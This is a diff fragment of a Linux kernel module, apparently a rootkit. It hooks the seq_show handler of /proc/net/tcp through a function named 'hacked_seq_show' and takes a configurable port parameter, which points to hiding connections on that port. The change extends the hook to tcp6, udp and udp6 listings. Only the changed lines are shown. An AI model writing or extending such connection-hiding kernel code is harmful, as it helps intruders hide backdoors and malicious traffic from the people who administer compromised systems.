@@ -4,11 +4,15 @@
 //#include <linux/fs.h>
 //#include <linux/proc_fs.h>
 #include <net/tcp.h>
+#include <net/udp.h>
 
 MODULE_LICENSE("GPL");
 
-#define PROC_FILE "/proc/net/tcp"
-int 	port=1234;
+const char proc_file[]= "/proc/net/tcp"; //you can change tcp to tcp6 or udp or udp6
+#define AFINFO struct tcp_seq_afinfo  //use this for tcp/tcp6
+//#define AFINFO struct udp_seq_afinfo  //use this for udp/udp6
+
+int port=1234;
 
 module_param(port, int, 0644);
 
@@ -32,8 +36,9 @@ int hacked_seq_show(struct seq_file *seq, void *v){
 
 static int lkm_init(void){
 	struct file *filp;
-	struct tcp_seq_afinfo *afinfo;
-	filp = filp_open(PROC_FILE,O_RDONLY, 0);
+	AFINFO *afinfo;     //use this for tcp/tcp6
+
+	filp = filp_open(proc_file,O_RDONLY, 0);
 	if(IS_ERR(filp)){
 		printk("vfs hook failed\n");
 	}
